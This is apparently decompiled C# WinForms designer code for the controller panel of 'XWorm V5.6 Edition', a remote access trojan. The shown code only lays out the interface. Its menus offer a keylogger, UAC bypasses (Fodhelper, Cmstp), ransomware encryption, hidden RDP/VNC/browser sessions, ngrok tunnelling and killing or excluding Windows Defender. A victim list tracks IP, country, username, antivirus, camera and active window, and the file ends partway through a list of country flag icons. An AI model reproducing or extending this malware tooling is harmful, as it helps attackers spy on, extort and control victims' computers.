		this.KeyLoggerToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
		this.KeyLoggerToolStripMenuItem1.Text = "[ KeyLogger ]";
		this.OfflineToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.OfflineToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("OfflineToolStripMenuItem1.Image");
		this.OfflineToolStripMenuItem1.Name = "OfflineToolStripMenuItem1";
		this.OfflineToolStripMenuItem1.Size = new System.Drawing.Size(124, 22);
		this.OfflineToolStripMenuItem1.Text = "[ Offline ]";
		this.OnlineToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.OnlineToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("OnlineToolStripMenuItem1.Image");
		this.OnlineToolStripMenuItem1.Name = "OnlineToolStripMenuItem1";
		this.OnlineToolStripMenuItem1.Size = new System.Drawing.Size(124, 22);
		this.OnlineToolStripMenuItem1.Text = "[ Online ]";
		this.ClientChatToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.ClientChatToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("ClientChatToolStripMenuItem.Image");
		this.ClientChatToolStripMenuItem.Name = "ClientChatToolStripMenuItem";
		this.ClientChatToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.ClientChatToolStripMenuItem.Text = "[ Client Chat ]";
		this.FilesSearcherToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.FilesSearcherToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("FilesSearcherToolStripMenuItem1.Image");
		this.FilesSearcherToolStripMenuItem1.Name = "FilesSearcherToolStripMenuItem1";
		this.FilesSearcherToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
		this.FilesSearcherToolStripMenuItem1.Text = "[ FilesSearcher ]";
		this.UACBypassToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.UACBypassToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.RunAsToolStripMenuItem1, this.FodhelperToolStripMenuItem, this.CmstpToolStripMenuItem });
		this.UACBypassToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("UACBypassToolStripMenuItem1.Image");
		this.UACBypassToolStripMenuItem1.Name = "UACBypassToolStripMenuItem1";
		this.UACBypassToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
		this.UACBypassToolStripMenuItem1.Text = "[ UAC Bypass ]";
		this.RunAsToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.RunAsToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("RunAsToolStripMenuItem1.Image");
		this.RunAsToolStripMenuItem1.Name = "RunAsToolStripMenuItem1";
		this.RunAsToolStripMenuItem1.Size = new System.Drawing.Size(141, 22);
		this.RunAsToolStripMenuItem1.Text = "[ RunAs ]";
		this.FodhelperToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.FodhelperToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("FodhelperToolStripMenuItem.Image");
		this.FodhelperToolStripMenuItem.Name = "FodhelperToolStripMenuItem";
		this.FodhelperToolStripMenuItem.Size = new System.Drawing.Size(141, 22);
		this.FodhelperToolStripMenuItem.Text = "[ Fodhelper ]";
		this.CmstpToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.CmstpToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("CmstpToolStripMenuItem.Image");
		this.CmstpToolStripMenuItem.Name = "CmstpToolStripMenuItem";
		this.CmstpToolStripMenuItem.Size = new System.Drawing.Size(141, 22);
		this.CmstpToolStripMenuItem.Text = "[ Cmstp ]";
		this.CommandsToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.CommandsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("CommandsToolStripMenuItem.Image");
		this.CommandsToolStripMenuItem.Name = "CommandsToolStripMenuItem";
		this.CommandsToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.CommandsToolStripMenuItem.Text = "[ Commands ]";
		this.MessageBoxToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.MessageBoxToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("MessageBoxToolStripMenuItem.Image");
		this.MessageBoxToolStripMenuItem.Name = "MessageBoxToolStripMenuItem";
		this.MessageBoxToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.MessageBoxToolStripMenuItem.Text = "[ MessageBox ]";
		this.Extra2ToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.Extra2ToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[11]
		{
			this.RansomwareToolStripMenuItem1, this.ReverseProxyToolStripMenuItem1, this.NgrokInstallerToolStripMenuItem, this.HiddenRDPToolStripMenuItem, this.HiddenBrowserToolStripMenuItem, this.HiddenVNCToolStripMenuItem, this.HiddenAppsToolStripMenuItem, this.BotkillerToolStripMenuItem, this.WDKillerToolStripMenuItem, this.WDDisableToolStripMenuItem,
			this.WDExclusionToolStripMenuItem
		});
		this.Extra2ToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("Extra2ToolStripMenuItem1.Image");
		this.Extra2ToolStripMenuItem1.Name = "Extra2ToolStripMenuItem1";
		this.Extra2ToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.Extra2ToolStripMenuItem1.Text = "[ Extra 2 ]";
		this.RansomwareToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.RansomwareToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.EncryptToolStripMenuItem1, this.DecryptToolStripMenuItem1 });
		this.RansomwareToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("RansomwareToolStripMenuItem1.Image");
		this.RansomwareToolStripMenuItem1.Name = "RansomwareToolStripMenuItem1";
		this.RansomwareToolStripMenuItem1.Size = new System.Drawing.Size(172, 22);
		this.RansomwareToolStripMenuItem1.Text = "[ Ransomware ]";
		this.EncryptToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.EncryptToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("EncryptToolStripMenuItem1.Image");
		this.EncryptToolStripMenuItem1.Name = "EncryptToolStripMenuItem1";
		this.EncryptToolStripMenuItem1.Size = new System.Drawing.Size(129, 22);
		this.EncryptToolStripMenuItem1.Text = "[ Encrypt ]";
		this.DecryptToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.DecryptToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("DecryptToolStripMenuItem1.Image");
		this.DecryptToolStripMenuItem1.Name = "DecryptToolStripMenuItem1";
		this.DecryptToolStripMenuItem1.Size = new System.Drawing.Size(129, 22);
		this.DecryptToolStripMenuItem1.Text = "[ Decrypt ]";
		this.ReverseProxyToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.ReverseProxyToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("ReverseProxyToolStripMenuItem1.Image");
		this.ReverseProxyToolStripMenuItem1.Name = "ReverseProxyToolStripMenuItem1";
		this.ReverseProxyToolStripMenuItem1.Size = new System.Drawing.Size(172, 22);
		this.ReverseProxyToolStripMenuItem1.Text = "[ Reverse Proxy ]";
		this.NgrokInstallerToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.NgrokInstallerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("NgrokInstallerToolStripMenuItem.Image");
		this.NgrokInstallerToolStripMenuItem.Name = "NgrokInstallerToolStripMenuItem";
		this.NgrokInstallerToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
		this.NgrokInstallerToolStripMenuItem.Text = "[ Ngrok Installer ]";
		this.HiddenRDPToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.HiddenRDPToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("HiddenRDPToolStripMenuItem.Image");
		this.HiddenRDPToolStripMenuItem.Name = "HiddenRDPToolStripMenuItem";
		this.HiddenRDPToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
		this.HiddenRDPToolStripMenuItem.Text = "[ Hidden RDP ]";
		this.HiddenBrowserToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.HiddenBrowserToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("HiddenBrowserToolStripMenuItem.Image");
		this.HiddenBrowserToolStripMenuItem.Name = "HiddenBrowserToolStripMenuItem";
		this.HiddenBrowserToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
		this.HiddenBrowserToolStripMenuItem.Text = "[ Hidden Browser ]";
		this.HiddenVNCToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.HiddenVNCToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.RunPEToolStripMenuItem, this.MemoryToolStripMenuItem2 });
		this.HiddenVNCToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("HiddenVNCToolStripMenuItem.Image");
		this.HiddenVNCToolStripMenuItem.Name = "HiddenVNCToolStripMenuItem";
		this.HiddenVNCToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
		this.HiddenVNCToolStripMenuItem.Text = "[ Hidden VNC ]";
		this.RunPEToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.RunPEToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("RunPEToolStripMenuItem.Image");
		this.RunPEToolStripMenuItem.Name = "RunPEToolStripMenuItem";
		this.RunPEToolStripMenuItem.Size = new System.Drawing.Size(133, 22);
		this.RunPEToolStripMenuItem.Text = "[ RunPE ]";
		this.MemoryToolStripMenuItem2.BackColor = System.Drawing.Color.White;
		this.MemoryToolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("MemoryToolStripMenuItem2.Image");
		this.MemoryToolStripMenuItem2.Name = "MemoryToolStripMenuItem2";
		this.MemoryToolStripMenuItem2.Size = new System.Drawing.Size(133, 22);
		this.MemoryToolStripMenuItem2.Text = "[ Memory ]";
		this.HiddenAppsToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.HiddenAppsToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("HiddenAppsToolStripMenuItem.Image");
		this.HiddenAppsToolStripMenuItem.Name = "HiddenAppsToolStripMenuItem";
		this.HiddenAppsToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
		this.HiddenAppsToolStripMenuItem.Text = "[ Hidden Apps ]";
		this.BotkillerToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.BotkillerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("BotkillerToolStripMenuItem.Image");
		this.BotkillerToolStripMenuItem.Name = "BotkillerToolStripMenuItem";
		this.BotkillerToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
		this.BotkillerToolStripMenuItem.Text = "[ Botkiller ]";
		this.WDKillerToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.WDKillerToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("WDKillerToolStripMenuItem.Image");
		this.WDKillerToolStripMenuItem.Name = "WDKillerToolStripMenuItem";
		this.WDKillerToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
		this.WDKillerToolStripMenuItem.Text = "[ WDKiller ]";
		this.WDDisableToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.WDDisableToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("WDDisableToolStripMenuItem.Image");
		this.WDDisableToolStripMenuItem.Name = "WDDisableToolStripMenuItem";
		this.WDDisableToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
		this.WDDisableToolStripMenuItem.Text = "[ WDDisable ]";
		this.WDExclusionToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.WDExclusionToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("WDExclusionToolStripMenuItem.Image");
		this.WDExclusionToolStripMenuItem.Name = "WDExclusionToolStripMenuItem";
		this.WDExclusionToolStripMenuItem.Size = new System.Drawing.Size(172, 22);
		this.WDExclusionToolStripMenuItem.Text = "[ WDExclusion ]";
		this.ClientToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.ClientToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.RestartToolStripMenuItem, this.CloseToolStripMenuItem1, this.UninstallToolStripMenuItem1, this.UpdateToolStripMenuItem1, this.NoteToolStripMenuItem1 });
		this.ClientToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("ClientToolStripMenuItem1.Image");
		this.ClientToolStripMenuItem1.Name = "ClientToolStripMenuItem1";
		this.ClientToolStripMenuItem1.Size = new System.Drawing.Size(190, 22);
		this.ClientToolStripMenuItem1.Text = "[ Client ]";
		this.RestartToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.RestartToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("RestartToolStripMenuItem.Image");
		this.RestartToolStripMenuItem.Name = "RestartToolStripMenuItem";
		this.RestartToolStripMenuItem.Size = new System.Drawing.Size(134, 22);
		this.RestartToolStripMenuItem.Text = "[ Restart ]";
		this.CloseToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.CloseToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("CloseToolStripMenuItem1.Image");
		this.CloseToolStripMenuItem1.Name = "CloseToolStripMenuItem1";
		this.CloseToolStripMenuItem1.Size = new System.Drawing.Size(134, 22);
		this.CloseToolStripMenuItem1.Text = "[ Close ]";
		this.UninstallToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.UninstallToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("UninstallToolStripMenuItem1.Image");
		this.UninstallToolStripMenuItem1.Name = "UninstallToolStripMenuItem1";
		this.UninstallToolStripMenuItem1.Size = new System.Drawing.Size(134, 22);
		this.UninstallToolStripMenuItem1.Text = "[ Uninstall ]";
		this.UpdateToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.UpdateToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("UpdateToolStripMenuItem1.Image");
		this.UpdateToolStripMenuItem1.Name = "UpdateToolStripMenuItem1";
		this.UpdateToolStripMenuItem1.Size = new System.Drawing.Size(134, 22);
		this.UpdateToolStripMenuItem1.Text = "[ Update ]";
		this.NoteToolStripMenuItem1.BackColor = System.Drawing.Color.White;
		this.NoteToolStripMenuItem1.Image = (System.Drawing.Image)resources.GetObject("NoteToolStripMenuItem1.Image");
		this.NoteToolStripMenuItem1.Name = "NoteToolStripMenuItem1";
		this.NoteToolStripMenuItem1.Size = new System.Drawing.Size(134, 22);
		this.NoteToolStripMenuItem1.Text = "[ Note ]";
		this.ClientFolderToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.ClientFolderToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("ClientFolderToolStripMenuItem.Image");
		this.ClientFolderToolStripMenuItem.Name = "ClientFolderToolStripMenuItem";
		this.ClientFolderToolStripMenuItem.Size = new System.Drawing.Size(190, 22);
		this.ClientFolderToolStripMenuItem.Text = "[ Client Folder ]";
		this.Guna2Panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.Guna2Panel1.Location = new System.Drawing.Point(0, 0);
		this.Guna2Panel1.Name = "Guna2Panel1";
		this.Guna2Panel1.Size = new System.Drawing.Size(915, 4);
		this.Guna2Panel1.TabIndex = 37;
		this.Guna2Panel5.Dock = System.Windows.Forms.DockStyle.Top;
		this.Guna2Panel5.Location = new System.Drawing.Point(0, 29);
		this.Guna2Panel5.Name = "Guna2Panel5";
		this.Guna2Panel5.Size = new System.Drawing.Size(915, 4);
		this.Guna2Panel5.TabIndex = 38;
		this.Guna2NotificationPaint1.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2NotificationPaint1.Size = new System.Drawing.Size(30, 18);
		this.Guna2NotificationPaint1.TargetControl = this.Guna2Button2;
		this.Guna2HtmlToolTip1.AllowLinksHandling = true;
		this.Guna2HtmlToolTip1.AutoPopDelay = 9000;
		this.Guna2HtmlToolTip1.InitialDelay = 500;
		this.Guna2HtmlToolTip1.MaximumSize = new System.Drawing.Size(0, 0);
		this.Guna2HtmlToolTip1.ReshowDelay = 100;
		this.PowerToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.PowerToolStripMenuItem.Name = "PowerToolStripMenuItem";
		this.PowerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.PowerToolStripMenuItem.Text = "[ Power ]";
		this.VoiceChatToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.VoiceChatToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("VoiceChatToolStripMenuItem.Image");
		this.VoiceChatToolStripMenuItem.Name = "VoiceChatToolStripMenuItem";
		this.VoiceChatToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
		this.VoiceChatToolStripMenuItem.Text = "[ Voice Chat ]";
		this.Lv1.BackColor = System.Drawing.Color.White;
		this.Lv1.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.Lv1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[18]
		{
			this._IP, this._Country, this._ID, this._Username, this._Operating, this._Group, this._Date, this._USB, this._UAC, this._Cam,
			this._CPU, this._GPU, this._Ram, this._Antivirus, this._Note, this._idle, this._Ping, this._ActiveWindow
		});
		this.Lv1.ContextMenuStrip = this.Guna2ContextMenuStrip2_3;
		this.Lv1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Lv1.Font = new System.Drawing.Font("Tahoma", 8f);
		this.Lv1.ForeColor = System.Drawing.Color.Black;
		this.Lv1.FullRowSelect = true;
		this.Lv1.HideSelection = false;
		this.Lv1.Location = new System.Drawing.Point(73, 33);
		this.Lv1.Name = "Lv1";
		this.Lv1.ShowGroups = false;
		this.Lv1.ShowItemToolTips = true;
		this.Lv1.Size = new System.Drawing.Size(842, 390);
		this.Lv1.SmallImageList = this.ii;
		this.Lv1.TabIndex = 0;
		this.Lv1.UseCompatibleStateImageBehavior = false;
		this.Lv1.View = System.Windows.Forms.View.Details;
		this._IP.Text = "[ IP ]";
		this._IP.Width = 129;
		this._Country.Text = "[ Country ]";
		this._Country.Width = 98;
		this._ID.Text = "[ ID ]";
		this._ID.Width = 104;
		this._Username.Text = "[ Username ]";
		this._Username.Width = 88;
		this._Operating.Text = "[ Operating System ]";
		this._Operating.Width = 137;
		this._Group.Text = "[ Group ]";
		this._Group.Width = 123;
		this._Date.Text = "[ Date ]";
		this._Date.Width = 108;
		this._USB.Text = "[ USB? ]";
		this._USB.Width = 78;
		this._UAC.Text = "[ UAC? ]";
		this._UAC.Width = 72;
		this._Cam.Text = "[ Cam? ]";
		this._Cam.Width = 97;
		this._CPU.Text = "[ CPU ]";
		this._CPU.Width = 170;
		this._GPU.Text = "[ GPU ]";
		this._GPU.Width = 170;
		this._Ram.Text = "[ RAM ]";
		this._Ram.Width = 100;
		this._Antivirus.Text = "[ Antivirus ]";
		this._Antivirus.Width = 150;
		this._Note.Text = "[ Note ]";
		this._Note.Width = 82;
		this._idle.Text = "[ LastInputTime ]";
		this._idle.Width = 130;
		this._Ping.Text = "[ Ping ]";
		this._Ping.Width = 80;
		this._ActiveWindow.Text = "[ ActiveWindow ]";
		this._ActiveWindow.Width = 350;
		this.Lv2.BackColor = System.Drawing.Color.White;
		this.Lv2.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.Lv2.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.ColumnHeader16, this.ColumnHeader17 });
		this.Lv2.ContextMenuStrip = this.Guna2ContextMenuStrip2;
		this.Lv2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Lv2.Font = new System.Drawing.Font("Tahoma", 8f);
		this.Lv2.ForeColor = System.Drawing.Color.Black;
		this.Lv2.FullRowSelect = true;
		this.Lv2.HideSelection = false;
		this.Lv2.Location = new System.Drawing.Point(73, 33);
		this.Lv2.Name = "Lv2";
		this.Lv2.ShowGroups = false;
		this.Lv2.ShowItemToolTips = true;
		this.Lv2.Size = new System.Drawing.Size(842, 390);
		this.Lv2.TabIndex = 3;
		this.Lv2.UseCompatibleStateImageBehavior = false;
		this.Lv2.View = System.Windows.Forms.View.Details;
		this.ColumnHeader16.Text = "[ Time ]";
		this.ColumnHeader16.Width = 123;
		this.ColumnHeader17.Text = "[ Message ]";
		this.ColumnHeader17.Width = 624;
		this.Lv3.BackColor = System.Drawing.Color.White;
		this.Lv3.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.Lv3.Columns.AddRange(new System.Windows.Forms.ColumnHeader[2] { this.ColumnHeader12, this.ColumnHeader13 });
		this.Lv3.ContextMenuStrip = this.Guna2ContextMenuStrip2_2;
		this.Lv3.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Lv3.Font = new System.Drawing.Font("Tahoma", 8f);
		this.Lv3.ForeColor = System.Drawing.Color.Black;
		this.Lv3.FullRowSelect = true;
		this.Lv3.HideSelection = false;
		this.Lv3.Location = new System.Drawing.Point(73, 33);
		this.Lv3.Name = "Lv3";
		this.Lv3.Size = new System.Drawing.Size(842, 390);
		this.Lv3.TabIndex = 4;
		this.Lv3.UseCompatibleStateImageBehavior = false;
		this.Lv3.View = System.Windows.Forms.View.Details;
		this.ColumnHeader12.Text = "[ Task ]";
		this.ColumnHeader12.Width = 123;
		this.ColumnHeader13.Text = "[ Execution ]";
		this.ColumnHeader13.Width = 237;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(915, 445);
		base.Controls.Add(this.Lv1);
		base.Controls.Add(this.Lv2);
		base.Controls.Add(this.Lv4);
		base.Controls.Add(this.Lv3);
		base.Controls.Add(this.Guna2Panel6);
		base.Controls.Add(this.StatusStrip1);
		base.Controls.Add(this.Guna2Panel5);
		base.Controls.Add(this.Guna2Panel2);
		base.Controls.Add(this.Guna2Panel1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "Main";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "XWorm V5.6 Edition";
		this.StatusStrip1.ResumeLayout(false);
		this.StatusStrip1.PerformLayout();
		this.Guna2ContextMenuStrip2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.performanceCounter2).EndInit();
		((System.ComponentModel.ISupportInitialize)this.performanceCounter1).EndInit();
		this.Guna2ContextMenuStrip2_1.ResumeLayout(false);
		this.Guna2Panel2.ResumeLayout(false);
		this.Guna2Panel6.ResumeLayout(false);
		this.Guna2ContextMenuStrip2.ResumeLayout(false);
		this.Guna2ContextMenuStrip2_2.ResumeLayout(false);
		this.Guna2ContextMenuStrip2_3.ResumeLayout(false);
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	[DllImport("uxtheme", CharSet = CharSet.Unicode)]
	public static extern int SetWindowTheme(IntPtr hWnd, string textSubAppName, string textSubIdList);

	public Main()
	{
		base.Load += Main_Load;
		base.FormClosing += Main_FormClosing;
		base.FormClosed += Main_FormClosed;
		base.Activated += Main_Activated;
		base.Deactivate += Main_Deactivate;
		gclass9s_0 = new List<GClass9>();
		InitializeComponent();
        this.ii.Images.SetKeyName(0, "--.png");
        this.ii.Images.SetKeyName(1, "AD.png");
        this.ii.Images.SetKeyName(2, "AE.png");
        this.ii.Images.SetKeyName(3, "AF.png");
        this.ii.Images.SetKeyName(4, "AG.png");
        this.ii.Images.SetKeyName(5, "AI.png");
        this.ii.Images.SetKeyName(6, "AL.png");
        this.ii.Images.SetKeyName(7, "AM.png");
        this.ii.Images.SetKeyName(8, "AN.png");
        this.ii.Images.SetKeyName(9, "AO.png");
        this.ii.Images.SetKeyName(10, "AQ.png");
        this.ii.Images.SetKeyName(11, "AR.png");
        this.ii.Images.SetKeyName(12, "AS.png");
        this.ii.Images.SetKeyName(13, "AT.png");
        this.ii.Images.SetKeyName(14, "AU.png");
        this.ii.Images.SetKeyName(15, "AW.png");
        this.ii.Images.SetKeyName(16, "AX.png");
        this.ii.Images.SetKeyName(17, "AZ.png");
        this.ii.Images.SetKeyName(18, "BA.png");
        this.ii.Images.SetKeyName(19, "BB.png");
        this.ii.Images.SetKeyName(20, "BD.png");
        this.ii.Images.SetKeyName(21, "BE.png");
        this.ii.Images.SetKeyName(22, "BF.png");
        this.ii.Images.SetKeyName(23, "BG.png");
        this.ii.Images.SetKeyName(24, "BH.png");
        this.ii.Images.SetKeyName(25, "BI.png");
        this.ii.Images.SetKeyName(26, "BJ.png");
        this.ii.Images.SetKeyName(27, "BL.png");
        this.ii.Images.SetKeyName(28, "BM.png");
        this.ii.Images.SetKeyName(29, "BN.png");
        this.ii.Images.SetKeyName(30, "BO.png");
        this.ii.Images.SetKeyName(31, "BR.png");
        this.ii.Images.SetKeyName(32, "BS.png");
        this.ii.Images.SetKeyName(33, "BT.png");
        this.ii.Images.SetKeyName(34, "BW.png");
        this.ii.Images.SetKeyName(35, "BY.png");
        this.ii.Images.SetKeyName(36, "BZ.png");
        this.ii.Images.SetKeyName(37, "CA.png");
        this.ii.Images.SetKeyName(38, "CC.png");
        this.ii.Images.SetKeyName(39, "CD.png");
        this.ii.Images.SetKeyName(40, "CF.png");
        this.ii.Images.SetKeyName(41, "CG.png");
        this.ii.Images.SetKeyName(42, "CH.png");
        this.ii.Images.SetKeyName(43, "CI.png");
        this.ii.Images.SetKeyName(44, "CK.png");
        this.ii.Images.SetKeyName(45, "CL.png");
        this.ii.Images.SetKeyName(46, "CM.png");
        this.ii.Images.SetKeyName(47, "CN.png");
        this.ii.Images.SetKeyName(48, "CO.png");
        this.ii.Images.SetKeyName(49, "CR.png");
        this.ii.Images.SetKeyName(50, "CU.png");
        this.ii.Images.SetKeyName(51, "CV.png");
        this.ii.Images.SetKeyName(52, "CW.png");
        this.ii.Images.SetKeyName(53, "CX.png");
        this.ii.Images.SetKeyName(54, "CY.png");
        this.ii.Images.SetKeyName(55, "CZ.png");
        this.ii.Images.SetKeyName(56, "DE.png");
        this.ii.Images.SetKeyName(57, "DJ.png");
        this.ii.Images.SetKeyName(58, "DK.png");
        this.ii.Images.SetKeyName(59, "DM.png");
        this.ii.Images.SetKeyName(60, "DO.png");
        this.ii.Images.SetKeyName(61, "DZ.png");
        this.ii.Images.SetKeyName(62, "EC.png");
        this.ii.Images.SetKeyName(63, "EE.png");
        this.ii.Images.SetKeyName(64, "EG.png");
        this.ii.Images.SetKeyName(65, "EH.png");
        this.ii.Images.SetKeyName(66, "ER.png");
        this.ii.Images.SetKeyName(67, "ES.png");
        this.ii.Images.SetKeyName(68, "ET.png");
        this.ii.Images.SetKeyName(69, "EU.png");
        this.ii.Images.SetKeyName(70, "FI.png");
        this.ii.Images.SetKeyName(71, "FJ.png");
        this.ii.Images.SetKeyName(72, "FK.png");
        this.ii.Images.SetKeyName(73, "FM.png");
        this.ii.Images.SetKeyName(74, "FO.png");
        this.ii.Images.SetKeyName(75, "FR.png");
        this.ii.Images.SetKeyName(76, "GA.png");
        this.ii.Images.SetKeyName(77, "GB.png");
        this.ii.Images.SetKeyName(78, "GD.png");
        this.ii.Images.SetKeyName(79, "GE.png");
        this.ii.Images.SetKeyName(80, "GG.png");
        this.ii.Images.SetKeyName(81, "GH.png");
        this.ii.Images.SetKeyName(82, "GI.png");
        this.ii.Images.SetKeyName(83, "GL.png");
        this.ii.Images.SetKeyName(84, "GM.png");
        this.ii.Images.SetKeyName(85, "GN.png");
        this.ii.Images.SetKeyName(86, "GQ.png");
        this.ii.Images.SetKeyName(87, "GR.png");
        this.ii.Images.SetKeyName(88, "GS.png");
        this.ii.Images.SetKeyName(89, "GT.png");
        this.ii.Images.SetKeyName(90, "GU.png");
        this.ii.Images.SetKeyName(91, "GW.png");
        this.ii.Images.SetKeyName(92, "GY.png");
        this.ii.Images.SetKeyName(93, "HK.png");
        this.ii.Images.SetKeyName(94, "HN.png");
        this.ii.Images.SetKeyName(95, "HR.png");
        this.ii.Images.SetKeyName(96, "HT.png");
        this.ii.Images.SetKeyName(97, "HU.png");
        this.ii.Images.SetKeyName(98, "IC.png");
        this.ii.Images.SetKeyName(99, "ID.png");
        this.ii.Images.SetKeyName(100, "IE.png");
        this.ii.Images.SetKeyName(101, "IL.png");
        this.ii.Images.SetKeyName(102, "IM.png");
        this.ii.Images.SetKeyName(103, "IN.png");
        this.ii.Images.SetKeyName(104, "IQ.png");
        this.ii.Images.SetKeyName(105, "IR.png");
        this.ii.Images.SetKeyName(106, "IS.png");
        this.ii.Images.SetKeyName(107, "IT.png");
        this.ii.Images.SetKeyName(108, "JE.png");
        this.ii.Images.SetKeyName(109, "JM.png");
        this.ii.Images.SetKeyName(110, "JO.png");
        this.ii.Images.SetKeyName(111, "JP.png");
        this.ii.Images.SetKeyName(112, "KE.png");
        this.ii.Images.SetKeyName(113, "KG.png");
        this.ii.Images.SetKeyName(114, "KH.png");
        this.ii.Images.SetKeyName(115, "KI.png");
        this.ii.Images.SetKeyName(116, "KM.png");
        this.ii.Images.SetKeyName(117, "KN.png");
        this.ii.Images.SetKeyName(118, "KP.png");
        this.ii.Images.SetKeyName(119, "KR.png");
        this.ii.Images.SetKeyName(120, "KW.png");
        this.ii.Images.SetKeyName(121, "KY.png");
        this.ii.Images.SetKeyName(122, "KZ.png");
        this.ii.Images.SetKeyName(123, "LA.png");
        this.ii.Images.SetKeyName(124, "LB.png");
        this.ii.Images.SetKeyName(125, "LC.png");
        this.ii.Images.SetKeyName(126, "LI.png");
        this.ii.Images.SetKeyName(127, "LK.png");
        this.ii.Images.SetKeyName(128, "LR.png");
        this.ii.Images.SetKeyName(129, "LS.png");
